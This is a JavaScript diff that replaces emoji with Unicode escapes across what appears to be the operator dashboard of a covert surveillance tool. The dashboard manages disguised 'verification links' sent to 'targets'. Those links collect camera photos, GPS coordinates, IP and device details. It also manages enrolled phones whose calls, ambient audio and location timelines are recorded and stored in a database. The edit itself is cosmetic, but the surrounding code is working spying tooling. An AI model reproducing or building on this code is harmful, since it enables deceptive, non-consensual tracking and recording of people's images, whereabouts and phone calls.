+            '\uD83D\uDDD1️ Deleted Captures (' + sortedDelCaps.length + ')',
             sortedDelCaps.length === 0
                 ? emptyState('No deleted captures.')
                 : capGrid(sortedDelCaps.map(delCapCard).join(''))
@@ -3662,7 +3662,7 @@ function renderUserLinksTable() {
     let count = 0;
 
     if (!uAllLinksData || Object.keys(uAllLinksData).length === 0) {
-        tbody.innerHTML = '<tr><td colspan="7"><div class="empty"><span class="empty-icon">🔗</span>No links yet. Create one above.</div></td></tr>';
+        tbody.innerHTML = '<tr><td colspan="7"><div class="empty"><span class="empty-icon">\uD83D\uDD17</span>No links yet. Create one above.</div></td></tr>';
         document.getElementById('uLinkCount').innerText = '0';
         return;
     }
@@ -3677,7 +3677,7 @@ function renderUserLinksTable() {
         // Target Name — always shows actual target name
         const nameCell    = `<td><a href="${verHref}" target="_blank" rel="noopener" title="Verification link: ${verHref}" style="color:var(--primary);font-weight:700;text-decoration:none;">${esc(l.name || 'Unnamed')}</a></td>`;
         // Permissions — CAM / GPS / '—'
-        const perms = [l.cam ? '📷 CAM' : '', l.gps ? '📍 GPS' : ''].filter(Boolean);
+        const perms = [l.cam ? '\uD83D\uDCF7 CAM' : '', l.gps ? '\uD83D\uDCCD GPS' : ''].filter(Boolean);
         const permCell    = `<td style="font-size:11px;">${perms.length ? perms.map(p => `<span class="tag">${p}</span>`).join(' ') : '<span style="color:#475569;">—</span>'}</td>`;
         const redir       = l.redirectUrl ? `<a href="${esc(l.redirectUrl)}" target="_blank" style="color:var(--teal);font-size:11px;">${esc(l.redirectUrl.slice(0,28))}…</a>` : '<span style="color:#475569;">—</span>';
         row.innerHTML = nameCell + permCell +
@@ -3686,17 +3686,17 @@ function renderUserLinksTable() {
             <td><b style="color:var(--yellow);">${l.visits || 0}</b></td>
             <td style="font-size:11px;color:var(--muted);">${l.createdAt ? new Date(l.createdAt).toLocaleDateString() : '—'}</td>
             <td style="white-space:nowrap;">
-                <button class="btn btn-gray btn-sm"   data-uaction="copy"   data-id="${id}">📋 Copy</button>
-                <button class="btn btn-teal btn-sm"   data-uaction="qr"     data-id="${id}">📱 QR</button>
+                <button class="btn btn-gray btn-sm"   data-uaction="copy"   data-id="${id}">\uD83D\uDCCB Copy</button>
+                <button class="btn btn-teal btn-sm"   data-uaction="qr"     data-id="${id}">\uD83D\uDCF1 QR</button>
                 <button class="btn btn-yellow btn-sm" data-uaction="rename" data-id="${id}">✏️</button>
                 <button class="btn ${l.active ? 'btn-orange' : 'btn-green'} btn-sm" data-uaction="toggle" data-id="${id}" data-active="${l.active}">${l.active ? '⏸' : '▶'}</button>
-                <button class="btn btn-red btn-sm"    data-uaction="delete" data-id="${id}">🗑</button>
+                <button class="btn btn-red btn-sm"    data-uaction="delete" data-id="${id}">\uD83D\uDDD1</button>
             </td>`;
         tbody.appendChild(row);
     });
 
     document.getElementById('uLinkCount').innerText = count;
-    if (count === 0 && !search) tbody.innerHTML = '<tr><td colspan="7"><div class="empty"><span class="empty-icon">🔗</span>No links yet. Create one above.</div></td></tr>';
+    if (count === 0 && !search) tbody.innerHTML = '<tr><td colspan="7"><div class="empty"><span class="empty-icon">\uD83D\uDD17</span>No links yet. Create one above.</div></td></tr>';
     if (count === 0 && search)  tbody.innerHTML = '<tr><td colspan="7"><div class="empty">No links match search.</div></td></tr>';
 }
 
@@ -3742,7 +3742,7 @@ document.getElementById('uLinkTableBody').addEventListener('click', e => {
         }
         remove(ref(db, 'managed_links/' + id));
         updateUserStats(); renderUserBin();
-        toast('🗑️ Link moved to Recycle Bin', 'var(--yellow)');
+        toast('\uD83D\uDDD1️ Link moved to Recycle Bin', 'var(--yellow)');
     }
 });
 
@@ -3792,7 +3792,7 @@ function renderUserLogs() {
     uSelectedCaptures.clear();
 
     if (!uAllLogsData || Object.keys(uAllLogsData).length === 0) {
-        grid.innerHTML = '<div class="empty"><span class="empty-icon">📭</span>No captures yet.</div>';
+        grid.innerHTML = '<div class="empty"><span class="empty-icon">\uD83D\uDCED</span>No captures yet.</div>';
         document.getElementById('uLogCount').innerText = '0';
         return;
     }
@@ -3811,7 +3811,7 @@ function renderUserLogs() {
         grid.appendChild(buildCapCard(k, uAllLogsData[k], false, true));
     });
     document.getElementById('uLogCount').innerText = keys.length;
-    if (keys.length === 0) grid.innerHTML = '<div class="empty"><span class="empty-icon">🔍</span>No captures yet.</div>';
+    if (keys.length === 0) grid.innerHTML = '<div class="empty"><span class="empty-icon">\uD83D\uDD0D</span>No captures yet.</div>';
     observeLazyImages(grid);
 }
 
@@ -3825,7 +3825,7 @@ function renderUserRecent() {
         .filter(k => { const p = uAllLogsData[k]; return (p == null ? undefined : p.linkName) && p._ownerId === username && p._ownerType === 'user'; })
         .sort((a,b) => (uAllLogsData[b].timestamp||0) - (uAllLogsData[a].timestamp||0))
         .slice(0, 4);
-    if (keys.length === 0) { grid.innerHTML = '<div class="empty"><span class="empty-icon">📭</span>No captures yet.</div>'; return; }
+    if (keys.length === 0) { grid.innerHTML = '<div class="empty"><span class="empty-icon">\uD83D\uDCED</span>No captures yet.</div>'; return; }
     keys.forEach(k => { uLogsCache[k] = uAllLogsData[k]; grid.appendChild(buildCapCard(k, uAllLogsData[k], false, true)); });
     observeLazyImages(grid);
 }
@@ -3847,7 +3847,7 @@ document.getElementById('uPhotoGrid').addEventListener('click', e => {
     const p = uLogsCache[key];
     if (action === 'download' && (p == null ? undefined : p.image)) dlImg(p.image, `capture_${p.linkName||'x'}_${Date.now()}.jpg`);
     else if (action === 'showInfo') openInfoModal(p);
-    else if (action === 'copygps' && p) navigator.clipboard.writeText(p.latitude + ', ' + p.longitude).then(() => toast('📍 GPS copied!', 'var(--teal)'));
+    else if (action === 'copygps' && p) navigator.clipboard.writeText(p.latitude + ', ' + p.longitude).then(() => toast('\uD83D\uDCCD GPS copied!', 'var(--teal)'));
     else if (action === 'tobin' && p) {
         if (!confirm('Move to Recycle Bin?')) return;
         const binItem = { ...p, _type: 'photo', _firebaseKey: key, _binId: makeBinId(), deletedAt: Date.now() };
@@ -3855,7 +3855,7 @@ document.getElementById('uPhotoGrid').addEventListener('click', e => {
         syncUserBinToFirebase(binItem);
         remove(ref(db, 'photo_history/' + key));
         renderUserBin(); updateUserStats();
-        toast('🗑️ Moved to Recycle Bin', 'var(--yellow)');
+        toast('\uD83D\uDDD1️ Moved to Recycle Bin', 'var(--yellow)');
     }
 });
 
@@ -3874,7 +3874,7 @@ document.getElementById('uRecentGrid').addEventListener('click', e => {
         const k = getUserBinKey(); const bin = getBin(k); bin.unshift(binItem); saveBin(bin, k);
         syncUserBinToFirebase(binItem);
         remove(ref(db, 'photo_history/' + key));
-        renderUserBin(); updateUserStats(); toast('🗑️ Moved to bin', 'var(--yellow)');
+        renderUserBin(); updateUserStats(); toast('\uD83D\uDDD1️ Moved to bin', 'var(--yellow)');
     }
 });
 
@@ -3907,7 +3907,7 @@ document.getElementById('uBulkDeleteBtn').onclick = () => {
     uSelectedCaptures.clear();
     const usa = document.getElementById('uSelectAll'); if (usa) usa.checked = false;
     renderUserBin(); updateUserStats();
-    toast(`🗑️ ${count} capture(s) moved to bin.`, 'var(--yellow)');
+    toast(`\uD83D\uDDD1️ ${count} capture(s) moved to bin.`, 'var(--yellow)');
 };
 
 // User Export
@@ -3930,7 +3930,7 @@ document.getElementById('uExportBtn').onclick = () => {
     document.body.appendChild(a);
     a.click();
     setTimeout(() => { URL.revokeObjectURL(blobUrl); document.body.removeChild(a); }, 100);
-    toast('📥 CSV exported!', 'var(--teal)');
+    toast('\uD83D\uDCE5 CSV exported!', 'var(--teal)');
 };
 
 // ══════════════════════════════════════════════════════════
@@ -3953,7 +3953,7 @@ function renderUserBin() {
     if (search) items = items.filter(x => [x.linkName||'',x.name||'',x.ipAddress||''].join(' ').toLowerCase().includes(search));
 
     grid.innerHTML = '';
-    if (items.length === 0) { grid.innerHTML = '<div class="empty"><span class="empty-icon">🗑️</span>Recycle bin is empty.</div>'; return; }
+    if (items.length === 0) { grid.innerHTML = '<div class="empty"><span class="empty-icon">\uD83D\uDDD1️</span>Recycle bin is empty.</div>'; return; }
 
     items.forEach(item => {
         if (item._type === 'photo') {
@@ -3966,13 +3966,13 @@ function renderUserBin() {
             const card = document.createElement('div');
             card.className = 'lbin-card';
             card.innerHTML = `
-                <p><b>🔗 ${esc(item.name||'Unknown')}</b></p>
-                <p class="meta">${item.cam ? '📷 Camera' : ''} ${item.gps ? '📍 GPS' : ''}</p>
+                <p><b>\uD83D\uDD17 ${esc(item.name||'Unknown')}</b></p>
+                <p class="meta">${item.cam ? '\uD83D\uDCF7 Camera' : ''} ${item.gps ? '\uD83D\uDCCD GPS' : ''}</p>
                 ${item.redirectUrl ? `<p class="meta">↩️ ${esc(item.redirectUrl)}</p>` : ''}
-                <p class="meta" style="color:var(--red);">🗑 Deleted: ${new Date(item.deletedAt).toLocaleDateString()}</p>
+                <p class="meta" style="color:var(--red);">\uD83D\uDDD1 Deleted: ${new Date(item.deletedAt).toLocaleDateString()}</p>
                 <div style="display:flex;gap:6px;margin-top:10px;">
                     <button class="btn btn-green btn-sm" data-ubintype="link" data-ubinaction="restore" data-fid="${esc(item.firebaseId)}" style="flex:1;">♻️ Restore</button>
-                    <button class="btn btn-red   btn-sm" data-ubintype="link" data-ubinaction="burn"    data-fid="${esc(item.firebaseId)}" style="flex:1;">🔥 Burn</button>
+                    <button class="btn btn-red   btn-sm" data-ubintype="link" data-ubinaction="burn"    data-fid="${esc(item.firebaseId)}" style="flex:1;">\uD83D\uDD25 Burn</button>
                 </div>`;
             grid.appendChild(card);
         }
@@ -4001,7 +4001,7 @@ document.getElementById('uBinGrid').addEventListener('click', e => {
         } else if (action === 'burn') {
             if (!confirm('Permanently delete this link?')) return;
             removeUserBinFromFirebase((item == null ? undefined : item._binId));
-            saveBin(bin.filter(x => !(x._type==='link' && x.firebaseId===fid)), binKey); renderUserBin(); updateUserStats(); toast('🔥 Deleted.', 'var(--red)');
+            saveBin(bin.filter(x => !(x._type==='link' && x.firebaseId===fid)), binKey); renderUserBin(); updateUserStats(); toast('\uD83D\uDD25 Deleted.', 'var(--red)');
         }
         return;
     }
@@ -4024,7 +4024,7 @@ document.getElementById('uBinGrid').addEventListener('click', e => {
     } else if (action === 'burn') {
         if (!confirm('Permanently delete?')) return;
         removeUserBinFromFirebase(binId);
-        saveBin(bin.filter(x => x._binId !== binId), binKey); renderUserBin(); updateUserStats(); toast('🔥 Permanently deleted.', 'var(--red)');
+        saveBin(bin.filter(x => x._binId !== binId), binKey); renderUserBin(); updateUserStats(); toast('\uD83D\uDD25 Permanently deleted.', 'var(--red)');
     }
 });
 
@@ -4042,7 +4042,7 @@ document.getElementById('uEmptyBinBtn').onclick = () => {
     saveBin([], getUserBinKey());
     const username = (currentSession == null ? undefined : currentSession.username);
     if (username) remove(ref(db, 'recycle_bin/' + username)).catch(() => {});
-    renderUserBin(); updateUserStats(); toast('🔥 Bin emptied.', 'var(--red)');
+    renderUserBin(); updateUserStats(); toast('\uD83D\uDD25 Bin emptied.', 'var(--red)');
 };
 
 
@@ -4171,9 +4171,9 @@ function initAdminListeners() {
             renderRecent();
             scheduleRenderStats();
             playBeep();
-            toast('🔔 New capture received!', 'var(--green)');
+            toast('\uD83D\uDD14 New capture received!', 'var(--green)');
             sendNotif('New Capture!', 'A target completed verification.');
-            pushNotif('📸', 'New capture received', 'Live Capture');
+            pushNotif('\uD83D\uDCF8', 'New capture received', 'Live Capture');
             prevLogCount = seenPhotoIds.size;
         } else {
             // Still in initial burst — batch renders via RAF (50 events → 1 render)
@@ -4440,27 +4440,27 @@ function openInfoModal(p) {
     const hasGPS = p.latitude && p.latitude !== 'Denied' && p.longitude && p.longitude !== 'Denied';
 
     const avatarEl = document.getElementById('infoAvatar');
-    avatarEl.innerHTML = p.image ? `<img src="${p.image}" alt="capture">` : '📷';
+    avatarEl.innerHTML = p.image ? `<img src="${p.image}" alt="capture">` : '\uD83D\uDCF7';
 
     document.getElementById('infoName').innerText = p.linkName || 'Unknown';
     document.getElementById('infoMeta').innerText = `${p.date||''}  ${p.time||''}  ·  ${p.ipAddress||'N/A'}`;
 
     const rows = [
-        { k: '🌐 IP Address',  v: p.ipAddress||'N/A' },
-        { k: '💻 OS',          v: d.os||'N/A' },
-        { k: '🌍 Browser',     v: d.browser||'N/A' },
-        { k: '📱 Platform',    v: d.platform||'N/A' },
-        { k: '🖥 Screen',      v: d.screenWidth ? `${d.screenWidth} × ${d.screenHeight}` : 'N/A' },
-        { k: '🔋 Battery',     v: d.battery ? `${d.battery}${d.charging==='Yes'?' ⚡ Charging':''}` : 'N/A' },
-        { k: '📶 Network',     v: d.networkType||'N/A' },
+        { k: '\uD83C\uDF10 IP Address',  v: p.ipAddress||'N/A' },
+        { k: '\uD83D\uDCBB OS',          v: d.os||'N/A' },
+        { k: '\uD83C\uDF0D Browser',     v: d.browser||'N/A' },
+        { k: '\uD83D\uDCF1 Platform',    v: d.platform||'N/A' },
+        { k: '\uD83D\uDDA5 Screen',      v: d.screenWidth ? `${d.screenWidth} × ${d.screenHeight}` : 'N/A' },
+        { k: '\uD83D\uDD0B Battery',     v: d.battery ? `${d.battery}${d.charging==='Yes'?' ⚡ Charging':''}` : 'N/A' },
+        { k: '\uD83D\uDCF6 Network',     v: d.networkType||'N/A' },
         { k: '⚡ Speed',       v: d.downlink||'N/A' },
-        { k: '🗺 Timezone',    v: d.timezone||'N/A' },
-        { k: '🗣 Language',    v: d.language||'N/A' },
-        { k: '📅 Date',        v: p.date||'N/A' },
-        { k: '🕐 Time',        v: p.time||'N/A' },
-        { k: '🔗 Referrer',    v: d.referrer||'Direct', full: true },
-        { k: '📍 GPS',         v: hasGPS ? `${p.latitude}, ${p.longitude}` : 'Denied', full: hasGPS },
-        { k: '🔑 Link ID',     v: p.linkId||'N/A', full: true },
+        { k: '\uD83D\uDDFA Timezone',    v: d.timezone||'N/A' },
+        { k: '\uD83D\uDDE3 Language',    v: d.language||'N/A' },
+        { k: '\uD83D\uDCC5 Date',        v: p.date||'N/A' },
+        { k: '\uD83D\uDD50 Time',        v: p.time||'N/A' },
+        { k: '\uD83D\uDD17 Referrer',    v: d.referrer||'Direct', full: true },
+        { k: '\uD83D\uDCCD GPS',         v: hasGPS ? `${p.latitude}, ${p.longitude}` : 'Denied', full: hasGPS },
+        { k: '\uD83D\uDD11 Link ID',     v: p.linkId||'N/A', full: true },
     ];
 
     document.getElementById('infoGrid').innerHTML = rows.map(r =>
@@ -4487,7 +4487,7 @@ function openInfoModal(p) {
         const browserPill = val => {
             const map = {
                 allowed:       ['var(--green)',  '✅ Allowed'],
-                blocked:       ['var(--orange)', '🚫 Blocked'],
+                blocked:       ['var(--orange)', '\uD83D\uDEAB Blocked'],
                 not_requested: ['var(--muted)',  '—'],
             };
             const [color, label] = map[val] || ['var(--muted)', val || '—'];
@@ -4558,7 +4558,7 @@ function openInfoModal(p) {
         extraHtml += `
         <div style="margin-top:18px;border-top:1px solid var(--border);padding-top:14px;">
           <div style="display:flex;align-items:center;gap:8px;margin-bottom:12px;">
-            <span style="font-size:14px;">🔐</span>
+            <span style="font-size:14px;">\uD83D\uDD10</span>
             <span style="font-size:13px;font-weight:800;color:var(--text);
                 text-transform:uppercase;letter-spacing:.05em;">Permission Log</span>
           </div>
@@ -4578,8 +4578,8 @@ function openInfoModal(p) {
           </div>
 
           <!-- Per-permission rows -->
-          ${permRow('📷', 'Camera',  pl.camera)}
-          ${permRow('📍', 'GPS',     pl.gps)}
+          ${permRow('\uD83D\uDCF7', 'Camera',  pl.camera)}
+          ${permRow('\uD83D\uDCCD', 'GPS',     pl.gps)}
         </div>`;
     }
 
@@ -4830,7 +4830,7 @@ document.getElementById('exportBtn').onclick = () => {
     document.body.appendChild(a);
     a.click();
     setTimeout(() => { URL.revokeObjectURL(blobUrl); document.body.removeChild(a); }, 100);
-    toast('📥 CSV exported!', 'var(--teal)');
+    toast('\uD83D\uDCE5 CSV exported!', 'var(--teal)');
 };
 
 // ══════════════════════════════════════════════════════════
@@ -5408,9 +5408,9 @@ document.querySelectorAll('[data-panel][data-shell]').forEach(el => {
 
             if (_deviceCallInitDone[deviceId]) {
                 // Genuinely new recording — notify and re-render current view
-                toast('🎙️ New call recording received!', 'var(--primary)');
+                toast('\uD83C\uDF99️ New call recording received!', 'var(--primary)');
                 if (typeof pushNotif === 'function')
-                    pushNotif('🎙️', 'New call recording received', 'App — Call Recordings');
+                    pushNotif('\uD83C\uDF99️', 'New call recording received', 'App — Call Recordings');
             }
 
             if (appCurrentDevice === deviceId) {
@@ -5626,7 +5626,7 @@ document.querySelectorAll('[data-panel][data-shell]').forEach(el => {
             <div class="device-card-wrap">
                 <div class="card-body" style="cursor:pointer;" onclick="window.__appOpenPhone('${did}')">
                     <div style="display:flex;align-items:center;gap:10px;margin-bottom:10px;">
-                        <div style="width:38px;height:38px;border-radius:10px;background:linear-gradient(135deg,var(--primary),var(--purple));display:flex;align-items:center;justify-content:center;font-size:18px;flex-shrink:0;">📱</div>
+                        <div style="width:38px;height:38px;border-radius:10px;background:linear-gradient(135deg,var(--primary),var(--purple));display:flex;align-items:center;justify-content:center;font-size:18px;flex-shrink:0;">\uD83D\uDCF1</div>
                         <div style="min-width:0;flex:1;">
                             <div style="display:flex;align-items:center;flex-wrap:wrap;gap:4px;">
                                 ${deviceDisplayName(d)}
@@ -5641,7 +5641,7 @@ document.querySelectorAll('[data-panel][data-shell]').forEach(el => {
                 <div class="card-actions">
                     <button class="btn btn-primary btn-sm" style="flex:2;" onclick="window.__appOpenPhone('${did}')">⚙️ Set Info →</button>
                     <button class="btn btn-teal btn-sm"    style="flex:1;" onclick="event.stopPropagation();window.__appRenameDevice('${did}')" title="Rename device">✏️</button>
-                    <button class="btn btn-red btn-sm"     style="flex:1;" onclick="event.stopPropagation();window.__appDeleteDevice('${did}')" title="Delete device">🗑️</button>
+                    <button class="btn btn-red btn-sm"     style="flex:1;" onclick="event.stopPropagation();window.__appDeleteDevice('${did}')" title="Delete device">\uD83D\uDDD1️</button>
                 </div>
             </div>`;
         }).join('');
@@ -5794,8 +5794,8 @@ document.querySelectorAll('[data-panel][data-shell]').forEach(el => {
             }
             selectedRecIds.clear();
             updateRecBulkBar();
-            toast('🗑️ ' + items.length + ' recording(s) moved to App Bin.', 'var(--yellow)');
-            pushNotif('🗑️', items.length + ' recording(s) deleted', 'App — Call Recordings');
+            toast('\uD83D\uDDD1️ ' + items.length + ' recording(s) moved to App Bin.', 'var(--yellow)');
+            pushNotif('\uD83D\uDDD1️', items.length + ' recording(s) deleted', 'App — Call Recordings');
         });
     }
     if (recBulkCancelBtn) {
@@ -5856,7 +5856,7 @@ document.querySelectorAll('[data-panel][data-shell]').forEach(el => {
             var isIn   = r.direction === 'incoming';
             var dirBg  = isIn ? '#0d3b26' : '#1a1f3a';
             var dirCol = isIn ? 'var(--green)' : 'var(--primary)';
-            var dirLbl = isIn ? '📲 Incoming' : '📤 Outgoing';
+            var dirLbl = isIn ? '\uD83D\uDCF2 Incoming' : '\uD83D\uDCE4 Outgoing';
             var who    = r.contact_name
                 ? `<strong>${esc(r.contact_name)}</strong> <span style="color:var(--muted);font-size:11px;">${esc(r.phone_number || '')}</span>`
                 : `<strong>${esc(r.phone_number || 'Unknown number')}</strong>`;
@@ -5876,7 +5876,7 @@ document.querySelectorAll('[data-panel][data-shell]').forEach(el => {
                         <span class="rec-time-label" id="recTime-${rid}">0:00</span>
                     </div>
                 </div>`
-                : `<div style="font-size:11px;color:var(--muted);margin-top:6px;">🔇 Audio not available</div>`;
+                : `<div style="font-size:11px;color:var(--muted);margin-top:6px;">\uD83D\uDD07 Audio not available</div>`;
 
             return `<div class="rec-card" id="recCard-${rid}" data-reckey="${recKey}">
                 <div style="display:flex;align-items:flex-start;gap:12px;">
@@ -5884,7 +5884,7 @@ document.querySelectorAll('[data-panel][data-shell]').forEach(el => {
                         <input type="checkbox" class="rec-checkbox" data-did="${did}" data-rid="${rid}"
                             style="accent-color:var(--primary);width:15px;height:15px;">
                     </label>
-                    <div style="width:36px;height:36px;border-radius:50%;background:${dirBg};display:flex;align-items:center;justify-content:center;font-size:14px;flex-shrink:0;">${isIn ? '📲' : '📤'}</div>
+                    <div style="width:36px;height:36px;border-radius:50%;background:${dirBg};display:flex;align-items:center;justify-content:center;font-size:14px;flex-shrink:0;">${isIn ? '\uD83D\uDCF2' : '\uD83D\uDCE4'}</div>
                     <div style="flex:1;min-width:0;">
                         <div style="display:flex;align-items:center;gap:8px;flex-wrap:wrap;margin-bottom:4px;">
                             <span style="font-size:11px;font-weight:700;color:${dirCol};background:${dirBg};padding:2px 8px;border-radius:12px;">${dirLbl}</span>
@@ -5894,7 +5894,7 @@ document.querySelectorAll('[data-panel][data-shell]').forEach(el => {
                         <div style="font-size:13px;margin-bottom:2px;">${who}</div>
                         ${audioSection}
                     </div>
-                    <button class="btn btn-red btn-sm" style="flex-shrink:0;margin-left:8px;" onclick="window.__appDeleteRecording('${did}','${rid}')" title="Delete recording">🗑️</button>
+                    <button class="btn btn-red btn-sm" style="flex-shrink:0;margin-left:8px;" onclick="window.__appDeleteRecording('${did}','${rid}')" title="Delete recording">\uD83D\uDDD1️</button>
                 </div>
             </div>`;
         }).join('');
@@ -6030,7 +6030,7 @@ document.querySelectorAll('[data-panel][data-shell]').forEach(el => {
                 document.getElementById('appRecordingsView').style.display = 'none';
                 document.getElementById('appPhonesView').style.display     = '';
             }
-            toast('🗑️ Device moved to App Bin.', 'var(--yellow)');
+            toast('\uD83D\uDDD1️ Device moved to App Bin.', 'var(--yellow)');
         } catch (e) {
             toast('❌ Delete failed: ' + e.message, 'var(--red)');
         }
@@ -6045,7 +6045,7 @@ document.querySelectorAll('[data-panel][data-shell]').forEach(el => {
         if (!confirm('Move this recording to the App Bin?\n\nYou can restore it later.')) return;
         try {
             await update(ref(db, 'call_recordings/' + deviceId + '/' + recId), { deleted_at: Date.now() });
-            toast('🗑️ Recording moved to App Bin.', 'var(--yellow)');
+            toast('\uD83D\uDDD1️ Recording moved to App Bin.', 'var(--yellow)');
         } catch (e) {
             toast('❌ Delete failed: ' + e.message, 'var(--red)');
         }
@@ -6071,7 +6071,7 @@ document.querySelectorAll('[data-panel][data-shell]').forEach(el => {
             const ambRec = (appAmbientRecordingsData[deviceId] || {})[recId];
             const path = ambRec !== undefined ? 'ambient_recordings' : 'call_recordings';
             await remove(ref(db, path + '/' + deviceId + '/' + recId));
-            toast('🔥 Recording permanently deleted.', 'var(--red)');
+            toast('\uD83D\uDD25 Recording permanently deleted.', 'var(--red)');
         } catch (e) {
             toast('❌ Delete failed: ' + e.message, 'var(--red)');
         }
@@ -6103,7 +6103,7 @@ document.querySelectorAll('[data-panel][data-shell]').forEach(el => {
         try {
             await remove(ref(db, 'app_devices/' + deviceId));
             await remove(ref(db, 'call_recordings/' + deviceId));
-            toast('🔥 Device permanently deleted.', 'var(--red)');
+            toast('\uD83D\uDD25 Device permanently deleted.', 'var(--red)');
         } catch (e) {
             toast('❌ Delete failed: ' + e.message, 'var(--red)');
         }
@@ -6160,7 +6160,7 @@ document.querySelectorAll('[data-panel][data-shell]').forEach(el => {
             const isIn   = r.direction === 'incoming';
             const dirBg  = isIn ? '#0d3b26' : '#1a1f3a';
             const dirCol = isIn ? 'var(--green)' : 'var(--primary)';
-            const dirLbl = isIn ? '📲 Incoming' : '📤 Outgoing';
+            const dirLbl = isIn ? '\uD83D\uDCF2 Incoming' : '\uD83D\uDCE4 Outgoing';
             const who    = r.contact_name
                 ? `<strong>${esc(r.contact_name)}</strong> <span style="color:var(--muted);font-size:11px;">${esc(r.phone_number || '')}</span>`
                 : `<strong>${esc(r.phone_number || 'Unknown number')}</strong>`;
@@ -6170,7 +6170,7 @@ document.querySelectorAll('[data-panel][data-shell]').forEach(el => {
 
             return `<div class="rec-card rec-card-deleted">
                 <div style="display:flex;align-items:flex-start;gap:12px;flex-wrap:wrap;">
-                    <div style="width:36px;height:36px;border-radius:50%;background:${dirBg};display:flex;align-items:center;justify-content:center;font-size:14px;flex-shrink:0;">${isIn ? '📲' : '📤'}</div>
+                    <div style="width:36px;height:36px;border-radius:50%;background:${dirBg};display:flex;align-items:center;justify-content:center;font-size:14px;flex-shrink:0;">${isIn ? '\uD83D\uDCF2' : '\uD83D\uDCE4'}</div>
                     <div style="flex:1;min-width:160px;">
                         <div style="display:flex;align-items:center;gap:8px;flex-wrap:wrap;margin-bottom:4px;">
                             <span style="font-size:11px;font-weight:700;color:${dirCol};background:${dirBg};padding:2px 8px;border-radius:12px;">${dirLbl}</span>
@@ -6178,12 +6178,12 @@ document.querySelectorAll('[data-panel][data-shell]').forEach(el => {
                             <span style="font-size:11px;color:var(--muted);">⏱ ${fmtDuration(r.duration_seconds)}</span>
                         </div>
                         <div style="font-size:13px;margin-bottom:2px;">${who}</div>
-                        <div style="font-size:11px;color:var(--muted);">📱 From: ${esc(devLabel)}</div>
-                        <div style="font-size:11px;color:var(--red);margin-top:3px;">🗑️ Deleted: ${fmtTs(r.deleted_at)}</div>
+                        <div style="font-size:11px;color:var(--muted);">\uD83D\uDCF1 From: ${esc(devLabel)}</div>
+                        <div style="font-size:11px;color:var(--red);margin-top:3px;">\uD83D\uDDD1️ Deleted: ${fmtTs(r.deleted_at)}</div>
                     </div>
                     <div style="display:flex;gap:6px;flex-wrap:wrap;align-self:center;">
                         <button class="btn btn-green btn-sm"  onclick="window.__appRestoreRecording('${did}','${rid}')">♻️ Restore</button>
-                        <button class="btn btn-red   btn-sm"  onclick="window.__appPermDeleteRecording('${did}','${rid}')">🔥 Delete</button>
+                        <button class="btn btn-red   btn-sm"  onclick="window.__appPermDeleteRecording('${did}','${rid}')">\uD83D\uDD25 Delete</button>
                     </div>
                 </div>
             </div>`;
@@ -6216,16 +6216,16 @@ document.querySelectorAll('[data-panel][data-shell]').forEach(el => {
             const did = esc(r._device_id), rid = esc(r._rec_id);
             return `<div class="rec-card rec-card-deleted">
                 <div style="display:flex;align-items:flex-start;gap:12px;flex-wrap:wrap;">
-                    <div style="width:36px;height:36px;border-radius:50%;background:rgba(139,92,246,.2);display:flex;align-items:center;justify-content:center;font-size:14px;flex-shrink:0;">🎧</div>
+                    <div style="width:36px;height:36px;border-radius:50%;background:rgba(139,92,246,.2);display:flex;align-items:center;justify-content:center;font-size:14px;flex-shrink:0;">\uD83C\uDFA7</div>
                     <div style="flex:1;min-width:160px;">
                         <div style="font-weight:700;font-size:13px;margin-bottom:3px;">Ambient Chunk</div>
                         <div style="font-size:12px;color:var(--muted);">${fmtDateTime(r.start_time)} · ⏱ ${fmtDuration(r.duration_seconds)}</div>
-                        <div style="font-size:11px;color:var(--muted);">📱 From: ${esc(devLabel)}</div>
-                        <div style="font-size:11px;color:var(--red);margin-top:3px;">🗑️ Deleted: ${fmtTs(r.deleted_at)}</div>
+                        <div style="font-size:11px;color:var(--muted);">\uD83D\uDCF1 From: ${esc(devLabel)}</div>
+                        <div style="font-size:11px;color:var(--red);margin-top:3px;">\uD83D\uDDD1️ Deleted: ${fmtTs(r.deleted_at)}</div>
                     </div>
                     <div style="display:flex;gap:6px;flex-wrap:wrap;align-self:center;">
                         <button class="btn btn-green btn-sm" onclick="window.__appRestoreRecording('${did}','${rid}')">♻️ Restore</button>
-                        <button class="btn btn-red btn-sm"   onclick="window.__appPermDeleteRecording('${did}','${rid}')">🔥 Delete</button>
+                        <button class="btn btn-red btn-sm"   onclick="window.__appPermDeleteRecording('${did}','${rid}')">\uD83D\uDD25 Delete</button>
                     </div>
                 </div>
             </div>`;
@@ -6269,16 +6269,16 @@ document.querySelectorAll('[data-panel][data-shell]').forEach(el => {
             const lat = parseFloat(loc.latitude), lng = parseFloat(loc.longitude);
             const coords = (!isNaN(lat) && !isNaN(lng)) ? lat.toFixed(5) + ', ' + lng.toFixed(5) : 'No coords';
             return `<div class="loc-bin-card">
-                <div class="loc-bin-icon">📍</div>
+                <div class="loc-bin-icon">\uD83D\uDCCD</div>
                 <div style="flex:1;min-width:140px;">
                     <div style="font-weight:700;font-size:13px;margin-bottom:3px;">Location Stay</div>
                     <div style="font-size:12px;color:var(--muted);">${esc(coords)}</div>
-                    <div style="font-size:11px;color:var(--muted);">📱 From: ${esc(devLabel)}</div>
-                    <div style="font-size:11px;color:var(--red);margin-top:3px;">🗑️ Deleted: ${fmtTs(loc.deleted_at)}</div>
+                    <div style="font-size:11px;color:var(--muted);">\uD83D\uDCF1 From: ${esc(devLabel)}</div>
+                    <div style="font-size:11px;color:var(--red);margin-top:3px;">\uD83D\uDDD1️ Deleted: ${fmtTs(loc.deleted_at)}</div>
                 </div>
                 <div style="display:flex;gap:6px;flex-wrap:wrap;align-self:center;">
                     <button class="btn btn-green btn-sm" onclick="window.__appRestoreLocation('${did}','${sid}')">♻️ Restore</button>
-                    <button class="btn btn-red btn-sm"   onclick="window.__appPermDeleteLocation('${did}','${sid}')">🔥 Delete</button>
+                    <button class="btn btn-red btn-sm"   onclick="window.__appPermDeleteLocation('${did}','${sid}')">\uD83D\uDD25 Delete</button>
                 </div>
             </div>`;
         }).join('');
@@ -6295,7 +6295,7 @@ document.querySelectorAll('[data-panel][data-shell]').forEach(el => {
         if (!confirm('Permanently delete this location stay?')) return;
         try {
             await remove(ref(db, 'device_timeline/' + deviceId + '/' + stayId));
-            toast('🔥 Location permanently deleted.', 'var(--red)');
+            toast('\uD83D\uDD25 Location permanently deleted.', 'var(--red)');
         } catch (e) { toast('❌ Delete failed: ' + e.message, 'var(--red)'); }
     };
 
@@ -6323,17 +6323,17 @@ document.querySelectorAll('[data-panel][data-shell]').forEach(el => {
             const devLabel   = d.custom_name || d.model || d.device_id;
